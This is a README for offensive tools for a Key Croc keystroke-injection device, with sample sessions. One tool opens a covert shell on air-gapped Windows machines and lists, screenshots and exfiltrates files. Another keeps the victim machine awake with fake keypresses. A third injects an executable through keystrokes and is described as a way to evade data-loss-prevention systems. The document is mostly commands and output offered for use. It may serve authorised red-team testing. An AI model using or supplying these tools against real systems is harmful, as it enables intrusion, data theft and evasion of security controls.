# Key Croc Tools

### Croc Shell

Allows the Croc to establish a reverse-shell on air-gapped systems. The Croc will act in `ATTACKMODE HID STORAGE` to collect the output of the commands and loot.

	root@croc:~# python udisk/tools/crocshell_via_storage.py 
	Starting the shell ...
	CrocSHELL> D:

	CrocSHELL> ls
	Verzeichnis: D:\


	Mode                 LastWriteTime         Length Name                                        
	----                 -------------         ------ ----                                        
	d-----        19.01.2023     09:32                000_BreachCompilation                       
	d-----        03.12.2022     22:36                3CX                                         
	d-----        26.01.2022     08:09                Blog                                        
	d-----        03.04.2022     12:26                Combs_1                                     
	d-----        25.01.2022     15:29                DFL                                         
	d-----        26.01.2022     00:30                DFLTask                                     
	d-----        10.02.2022     13:39                Honor 8S                                    
	d-----        23.10.2016     08:52                plaso-1.5.1                                 
	d-----        26.01.2022     07:53                ZZZ_FONTS                                   
	-a----        04.05.2023     09:57         487556 173.jpg                                     
	-a----        04.05.2023     10:12         206541 173.mp3                                     
	-a----        04.05.2023     13:44        1415029 173.mp4                                     
	-a----        25.01.2023     20:11           5050 banner.txt                                  
	-a----        17.02.2022     14:08     1994995712 paladin_edge_64.iso                         
	-a----        03.07.2022     09:27        1577592 WordRepair.exe                              
	CrocSHELL> L:

	CrocSHELL> ls
	Verzeichnis: L:\


	Mode                 LastWriteTime         Length Name                                        
	----                 -------------         ------ ----                                        
	d-----        14.07.2021     12:14                CDFE                                        
	d-----        12.01.2022     16:12                CDFP                                        
	d-----        13.08.2020     08:33                DFL Manuals                                 
	d-----        20.03.2020     14:01                JPG_Hi_Res                                  
	d-----        10.06.2021     18:38                PaWASP                                      
	d-----        11.02.2023     13:50                UnFOUNDchk                                  
	------        21.08.2021     20:06         126205 20210821_200626_FLASH_25010.dat.gz          
	------        20.10.2020     15:35          90539 5c21487e-3812-4498-b66a-eafe679bc4c8.jpg    
	------        01.04.2021     11:16         144368 7a39a04273-9fc4-4e18-b256-9c489b9c6a1c.jpeg 
	------        01.04.2021     11:16         128311 7a61adbd-8e52-4bad-9203-fc842d4069d2.jpeg   
	------        04.11.2020     18:52         627966 hddsuperclone_2.2.18-1_amd64.deb            
	------        27.04.2023     15:33          70553 PawnP1_01.png                               
	------        27.04.2023     15:51          19861 Pawnp1_02.png                               

	CrocSHELL> peek
	E:\screenshot_5.jpg ... saved

	CrocSHELL> exfil PawnP1_01.png

	CrocSHELL> help

	AVIALABLE COMMANDS:
	--------------------
	exit .... End shell 
	exfil ... Exfiltrate file - e.g.: exfil my_secret_passwords.docx
	peek .... Take a screenshot

	CrocSHELL> exit
	root@croc:~# 

### Prevent the system to go to sleep

Sends a `SHIFT` keypress each 50 seconds if there is no keyboard activity

	root@croc:~# python udisk/tools/prevent_sleep.py 
	Sending SHIFT keypress for the 1. time!
	Sending SHIFT keypress for the 2. time!
	...
	Sending SHIFT keypress for the 897. time!
	^C
	root@croc:~#

You can also run the command in background and log out 

	root@croc:~# python udisk/tools/prevent_sleep.py &
	[1] 9219
	root@croc:~#

### Upload files without network or storage interactions

This allow you to upload a file without triggering many DLP systems

	root@croc:~/udisk/tools# python fileupload_via_quack.py bob.exe "D:\Z1.exe"
	OPENING powershell.exe
	SENDING CHUNK 1 / 481 ... DONE
	SENDING CHUNK 2 / 481 ... DONE
	...
	SENDING CHUNK 481 / 481 ... DONE
	DONE IN 1727.92612386 SEC.